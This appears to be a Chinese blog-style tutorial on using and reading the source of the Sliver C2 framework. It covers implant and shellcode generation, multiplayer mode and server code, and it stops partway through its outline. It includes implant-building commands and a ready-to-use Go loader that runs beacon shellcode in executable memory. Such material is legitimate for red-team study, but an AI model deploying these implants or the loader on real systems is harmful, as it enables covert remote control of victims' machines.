sliver 简单使⽤及源码浅析
1
sliver 简单使⽤及源码浅析
作者 
 https://github.com/Ciyfly
因笔者技术能⼒有限 有些地⽅有些错误欢迎各位师傅指出 也欢迎各位师傅有任何问题跟我交流沟通
⽬录
@Recar
⽬录
简单使⽤
先启动⼀个监听器
⽣成植⼊端 exe
上线
临时退出当前会话 后台
⽣成shellcode bin
开启多⼈模式
⽣成连接配置
客户端
客户端连接
server 服务端
server main
console.Start() 
服务端开启多⼈模式通信
multiplayer 开启多⼈模式
⽣成连接配置
client 客户端
implant  植⼊端
截图
sliver 植⼊端 main函数
受害机环境执⾏限制检测
beacon模式
session模式
beacon与session模式区别
beacon怎么⽣成
http beacon
mtls beacon
wgBeacon
dns beacon
renderSliverGoCode 模板代码⽣成go⽂件
shellcode怎么⽣成的
进程迁移怎么实现的
DLL Hijack
分阶段与⽆阶段的stager有啥区别
⼀些可以抄的代码
获取根程序⽬录
单独给⼀个 cmd.exec设置环境变量
sliver 简单使⽤及源码浅析
2
简单使⽤
sliver的wiki
https://github.com/BishopFox/sliver/wiki
先启动⼀个监听器
⽣成植⼊端 exe
这⾥使⽤http的 他还有 https mls 等监听器
generate -b ip或者域名
-b 可以指定监听的ip或者域名
最后exe会⽣成到当前路径 
下载执⾏就会上线
上线
查看 session
go原⽣log设置输出格式
判断程序是否被调试
go模板的使⽤
go fallthrough
简单的⽣成随机字符串的⽅式
sliver 简单使⽤及源码浅析
3
进⼊beacon的话是use id
临时退出当前会话 后台
background
⽣成shellcode bin
generate  -b ip/domain -f shellcode
sliver 简单使⽤及源码浅析
4
怎么加载这段shellcode呢 这⾥有代码可以直接⽤
申请内存 写⼊ call后可以直接调⽤sliver那边可以看到直接就上线了
func Run(shellcodeBeacon []byte) { 
 addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcodeBeacon)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE) // 为shellcode申请内存空间
 _, _, _ = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcodeBeacon[0])), uintptr(len(shellcodeBeacon))) // 将shellcode内存复制到申
 syscall.Syscall(addr, 0, 0, 0, 0) 
}
开启多⼈模式
sliver > multiplayer -l 8081
这个多⼈模式的通信⽅式是grpc
⽣成连接配置
[server] sliver > new-operator -l ip -p port-n test 
[*] Generating new client certificate, please wait ...  
[*] Saved new client config to: /root/sliver/test_ip.cfg
客户端
PS D:\code\sliver> .\sliver-client_windows.exe --help 
Usage: 
  sliver-client [flags] 
  sliver-client [command] 
Available Commands: 
  help        Help about any command 
  import      Import a client configuration file 
sliver 简单使⽤及源码浅析
5
  version     Print version and exit 
Flags: 
  -h, --help   help for sliver-client 
Use "sliver-client [command] --help" for more information about a command.
客户端连接
要先将服务端⽣成的cfg 下载下来后 然后再直接执⾏客户端 并指定cfg
导⼊命令
.\sliver-client_windows.exe import .\test_ip.cfg
然后就可以连接 如果导⼊了多个配置⽂件可以选择连接哪个
然后就可以跟server端的控制台⼀样的命令了
sliver 简单使⽤及源码浅析
6
服务端和客户端都可以在这⾥下载
https://github.com/BishopFox/sliver/releases
接下来是对源码的⼀次简单分析
server 服务端
在server readme⾥有数⽬每个⽬录的功能
同样 client⾥也会有read⾥的相关readme
因为我们直接运⾏后是server端 也是主要功能 所以我们看下server下⾯的⽬录
如下 
assets      嵌⼊到服务器⼆进制⽂件中的静态资产，以及操作这些资产的⽅法。 
c2      服务器端命令和控制实现 
certs      X509证书⽣成和管理代码 
cli   命令⾏接⼝实现 
configs      配置⽂件解析器 
console      特定于服务器的控制台代码，⼤部分⼩控制台代码位于`/client/console中` 
core      管理植⼊、客户端等连接状态的数据结构和⽅法。 
cryptography      围绕Go的⼀些标准'crypto'API的加密代码和包装 
daemon      作为守护进程启动服务器的⽅法 
db      数据库客户端、助⼿函数和ORM模型 
generate      此包⽣成植⼊可执⾏⽂件和共享库 
gogo      围着围棋编译器⼯具链的围棋包装器 
handlers      ⽅法可通过植⼊调⽤，⽆需⽤户交互 
sliver 简单使⽤及源码浅析
7
log      logrus 包装器 
loot      服务器的本地'loot'实现 
msf      Metasploit助⼿函数 
netstack      ireGuard服务器⽹络堆栈 
rpc      远程过程调⽤实现，通常由/client调⽤ 
transport      将服务器连接到 /client 
watchtower      监控威胁英特尔平台的植⼊物的代码 
main.go ⼊⼝
我们直接看 server⽬录下的main.go ⼊⼝
server main
1. 初始化 尝试⽤安全rand随机种⼦ 
2. 执⾏cli的Execute⽅法 server\cli\cli.go rootCmd.Execute()
import ( 
 "crypto/rand" 
 "encoding/binary" 
 insecureRand "math/rand" 
 "time" 
 "github.com/bishopfox/sliver/server/cli" 
) 
// Attempt to seed insecure rand with secure rand, but we really 
// don't care that much if it fails since it's insecure anyways 
func init() { 
 buf := make([]byte, 8) 
 _, err := rand.Read(buf) 
 if err != nil { 
  insecureRand.Seed(int64(time.Now().Unix())) 
 } else { 
  insecureRand.Seed(int64(binary.LittleEndian.Uint64(buf))) 
 } 
} 
func main() { 
 cli.Execute() 
}
cli的创建是使⽤的  github.com/spf13/cobra  ⽤于创建cli的库来实现的
如下是cli.Execute() ⾥⾯最后调⽤的
1. 配置根⽬录配置⽇志
2. 捕获所有异常并输出栈信息
3. 初始化⼀些数据
       a. assets 是初始化资源环境信息 如go的gopath 这⾥⾯使⽤了go的 embed技术 包裹了
            go.zip  src.zip然后解析go.zip 和src.zip 还包裹了garble 后续⽤来混淆这块代码路径在                 
           server\assets\assets.go
       b. certs.SetupCAs 是初始化证书 有https的有多⼈模式通信的有server本⾝的有mtls的
       c. certs.SetupWGKeys 是初始化公私钥 会存⼊数据库中
       d. cryptography.ECCSserverKeyPair 是 获取aes加密秘钥key 没有的话就⽣成
       e. cryptography.TOTPSserverSecret 是初始化top验证 (totp技术参考 https://www.jianshu.com/p/c056340d6914 可以⽤做key同
步 ⽤做加密 当超时就不能在解密了)
       f. cryptography.MinisignServerPrivateKey 是 获取服务器的 minisign 密钥对 ⽤来做签署⽂件和验证签名的
       g. 加载配置⽂件 是当前路径下的 configs/server.json
sliver 简单使⽤及源码浅析
8
       h. c2.StartPersistenJobs 是根据配置⽂件启动后台监听器 如果没配置就不会启动
4. 如果是后台模式调⽤ daemon.Start 否则就启动控制台 consoles.start
      daemon.start 需要配置监听ip 端⼝ 然后启动客户端监听器 监听客户端的连接
      代码在 server/daemon/daemon.go
var rootCmd = &cobra.Command{ 
 Use:   "sliver-server", 
 Short: "", 
 Long:  ``, 
 Run: func(cmd *cobra.Command, args []string) { 
  // Root command starts the server normally 
  appDir := assets.GetRootAppDir() 
  logFile := initLogging(appDir) 
  defer logFile.Close() 
  defer func() { 
   if r := recover(); r != nil { 
    log.Printf("panic:\n%s", debug.Stack()) 
    fmt.Println("stacktrace from panic: \n" + string(debug.Stack())) 
    os.Exit(99) 
   } 
  }() 
  // 输出⼀些banner信息 
  assets.Setup(false, true) 
  certs.SetupCAs() 
  certs.SetupWGKeys() 
  cryptography.ECCServerKeyPair() 
  cryptography.TOTPServerSecret() 
  cryptography.MinisignServerPrivateKey() 
  serverConfig := configs.GetServerConfig() 
  c2.StartPersistentJobs(serverConfig) 
  if serverConfig.DaemonMode { 
   daemon.Start(daemon.BlankHost, daemon.BlankPort) 
  } else { 
   os.Args = os.Args[:1] // Hide cli from grumble console 
   console.Start() 
  } 
 }, 
}
console.Start() 
1. 启动本地监听器
2. 创建grpc的⾃定义 dialer函数 ⽤于创建tcp链接
3. 创建options grpc的参数并初始化连接 
4. 获取本地grpc连接的client 
5. 将rpc 参数传⼊ clientconsole.Start函数
func Start() { 
 _, ln, _ := transport.LocalListener() 
 ctxDialer := grpc.WithContextDialer(func(context.Context, string) (net.Conn, error) { 
  return ln.Dial() 
 }) 
 options := []grpc.DialOption{ 
  ctxDialer, 
  grpc.WithInsecure(), // This is an in-memory listener, no need for secure transport 
  grpc.WithDefaultCallOptions(grpc.MaxCallRecvMsgSize(clienttransport.ClientMaxReceiveMessageSize)), 
 } 
 conn, err := grpc.DialContext(context.Background(), "bufnet", options...) 
 if err != nil { 
  fmt.Printf(Warn+"Failed to dial bufnet: %s\n", err) 
  return 
 } 
sliver 简单使⽤及源码浅析
9
 defer conn.Close() 
 localRPC := rpcpb.NewSliverRPCClient(conn) 
 if err := configs.CheckHTTPC2ConfigErrors(); err != nil { 
  fmt.Printf(Warn+"Error in HTTP C2 config: %s\n", err) 
 } 
 clientconsole.Start(localRPC, command.BindCommands, serverOnlyCmds, true) 
}
跟⼊ clientconsole.Start 函数  
代码路径在 client/console/console.go
1. assets.Setup(false, false) 创建本地资源数据 如 版本 输出lincense信息等
2. assets.LoadSettings() 获取默认的设置信息
3. 初始化con 即 sliver控制台客户端 ⽤于连接server
4. 输出logo信息 con.PrintLogo()
5. 添加客户端命令参数 bindCmds(con)  命令参数在这⾥ client/command/commands.go
6. 添加服务端特有的⼀些命令参数extraCmds(con) 服务端的命令参数在这⾥server/console/console.go
7. go con.EventLoop() 启动循环监听  可以接收事件上报 例如上线 客户端连接等有不同的类型然后判断处理
8. conn.TunnelLoop(rpc) 启动隧道数据循环 解析传⼊的隧道消息并将它们分发 // 到会话/隧道对象 
9. 运⾏这个cli 
服务端开启多⼈模式通信
multiplayer 开启多⼈模式
多⼈模式即 可以使⽤客户端连接 服务端执⾏ 之间的通信是采⽤的grpc的⽅式
grpc是 是 Google 发起的⼀个开源远程过程调⽤系统，该系统基于 HTTP/2 协议传输 是⼀种rpc的⽅式
多⼈模式服务端默认监听的端⼝是 31337
下⾯是命令⾏参数的
console.App.AddCommand(&grumble.Command{ 
  Name:     consts.MultiplayerModeStr, 
  Help:     "Enable multiplayer mode", 
  LongHelp: help.GetHelpFor([]string{consts.MultiplayerModeStr}), 
  Flags: func(f *grumble.Flags) { 
   f.String("L", "lhost", "", "interface to bind server to") 
   f.Int("l", "lport", 31337, "tcp listen port") 
   f.Bool("p", "persistent", false, "make persistent across restarts") 
  }, 
  Run: func(ctx *grumble.Context) error { 
   fmt.Println() 
   startMultiplayerModeCmd(ctx) 
   fmt.Println() 
   return nil 
  }, 
  HelpGroup: consts.MultiplayerHelpGroup, 
 })
可以看到主要是 调⽤的 startMultiplayerModeCmd⽅法
1. 获取参数如 监听的ip 端⼝ persistent是是否持久化 默认是关闭的
2. jobStartClientListener 根据ip 端⼝ 启动⼀个客户端监听 
sliver 简单使⽤及源码浅析
10
3. 如果开启了持久化会将当前的持久化配置存储到配置⽂件中
func startMultiplayerModeCmd(ctx *grumble.Context) { 
 lhost := ctx.Flags.String("lhost") 
 lport := uint16(ctx.Flags.Int("lport")) 
 persistent := ctx.Flags.Bool("persistent") 
 _, err := jobStartClientListener(lhost, lport) 
 if err == nil { 
  fmt.Printf(Info + "Multiplayer mode enabled!\n") 
  if persistent { 
   serverConfig := configs.GetServerConfig() 
   serverConfig.AddMultiplayerJob(&configs.MultiplayerJobConfig{ 
    Host: lhost, 
    Port: lport, 
   }) 
   serverConfig.Save() 
  } 
 } else { 
  fmt.Printf(Warn+"Failed to start job %v\n", err) 
 } 
}
⽣成连接配置